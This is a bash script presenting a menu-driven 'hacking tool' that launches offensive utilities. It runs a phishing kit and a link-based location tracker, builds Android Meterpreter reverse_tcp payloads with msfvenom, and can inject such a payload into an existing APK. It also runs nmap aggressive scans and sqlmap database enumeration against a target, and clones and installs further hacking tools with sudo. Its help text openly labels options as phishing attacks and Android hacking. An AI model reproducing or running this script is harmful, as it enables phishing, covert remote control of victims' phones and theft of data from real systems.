banerelaraby(){


cat <<'EOF'
         ██╗██████╗  ██████╗     ███████╗ ██████╗ ██╗   ██╗ █████╗ ██████╗ 
         ██║██╔══██╗██╔═══██╗    ██╔════╝██╔═══██╗██║   ██║██╔══██╗██╔══██╗
         ██║██║  ██║██║   ██║    █████╗  ██║   ██║██║   ██║███████║██║  ██║
    ██   ██║██║  ██║██║   ██║    ██╔══╝  ██║   ██║██║   ██║██╔══██║██║  ██║
    ╚█████╔╝██████╔╝╚██████╔╝    ██║     ╚██████╔╝╚██████╔╝██║  ██║██████╔╝
     ╚════╝ ╚═════╝  ╚═════╝     ╚═╝      ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
EOF

printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'
echo "this tool is done by el3araby & FOUAD"

echo " ------------------------------------------------ "
echo " 1- zphisher                                    - "
echo " 2- ELARABYGBS                                  - "
echo " 3- MAKE A PAYLOAD FOR ANDROID                  - "
echo " 4- MAKE A PAYLOAD FOR ANDROID ON ORG APK       - "
echo " 5- run metasploit                              - "
echo " 6- download zphisher                           - "
echo " 7- download ELARABYGBS                         - "
echo " 8- SCAN ip or domain by nmap                   - "
echo " 9- download HACKINGTOOL                        - "
echo " 10- run HACKINGTOOL                            - "
echo " 11- Trying SQLMAP ON TARGET                    - "
echo " 12- HELP                                       - "
echo " 13- UPDATE AND UPGRADE YOUR LINUX              - "
echo " 14- CONTACT WITH ME                            - "
echo " ------------------------------------------------- "
echo " enter the number of option you want to run  :   "
}
author(){
echo " ----------------------------- "
echo " this tool maded by el3araby "
echo " I LOVE U "
echo " ----------------------------- "
}
el3araby(){
read choice

case $choice in
	1)
		echo "runing zphisher"
		cd zphisher && bash zphisher.sh
		;;
	2)
		echo "rnning ELARABYGBS"
		cd ELARABYGBS && bash el3araby.sh
		;;
	3)
		echo "makeing a payload"
		read -p "ENTER your LHOST " LHOST
		read -p " enter your LPORT : " LPORT
		read -p " enter your apk final name : " NAME
		echo " please wait "
		msfvenom -p android/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -o $NAME.apk
		;;
	4)
		echo "makeing a payload"
		read -p "ENTER THE PATH OF ORIGINAL APK" ORG
                read -p "ENTER your LHOST " LHOST
                read -p "ENTER your LPORT : " LPORT
                read -p "ENTER your apk final name : " NAME
		msfvenom -x $ORG -p android/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -o $NAME.apk
		;;
	5)
		echo "runing metasploit"
		msfconsole
		;;
	6)
		echo "downloading zphisher"
		git clone https://github.com/htr-tech/zphisher.git
		;;
	7)
		echo "downloading ELARABYGBS"
		git clone https://github.com/b7of/ELARABYGBS.git
		;;
	8)
		read -p "ENTER THE IP OR DOMAIN " IP
		nmap -T4 -A -v $IP
		;;
	9)
		echo"DOWNLOADING HACKINGTOOL"
		git clone https://github.com/Z4nzu/hackingtool.git && chmod -R 755 hackingtool && cd hackingtool && sudo bash install.sh && sudo hackingtool
		;;
	10) 
		echo"RUNING HACKINGTOOL"
		sudo hackingtool
		;;
	11) 
		read -p "ENTER YOUR TARGET LINK : " TARGET
		sqlmap -u $TARGET --dbs --batch
		;;
	12)
		echo" YOU CAN USE MY TOOL BY WRITE A NUMBER OF THE TASK YOU WANT "
		echo" 1 : FOR PHISHING ATTACK & 2 : FOR LOCATION BY LINK & 3,4 FOR HACK ANDROID BY APK"
		echo" 5 : TO RUN METASPLOIT & 6,7,9 TO DOWNLOAD TOOLS & 8 TO USE NMAP ON IP OR DOMAIN"
		echo" 10 : TO RUN HACKING TOOL ( A MULTITASK TOOL ) , 11 : TO RUN SQLMAP "
		;;
	13) 
		echo "UPDATE AND UPGRADING"
		sudo apt-get update -y && sudo apt-get upgrade -y
		;;
	14)
		echo " ENG : EL3ARABY & FOUAD "
		echo " github : https://github.com/loals2sa "
		echo " instagram : https://instagram.com/1.pvl "
		echo " telegram : @blackhatfouad"
		;;
	*)
		echo" invaild option enter the number from 1 to 6 "
		echo" good bye "
		;;
esac
}

banerelaraby
el3araby
author
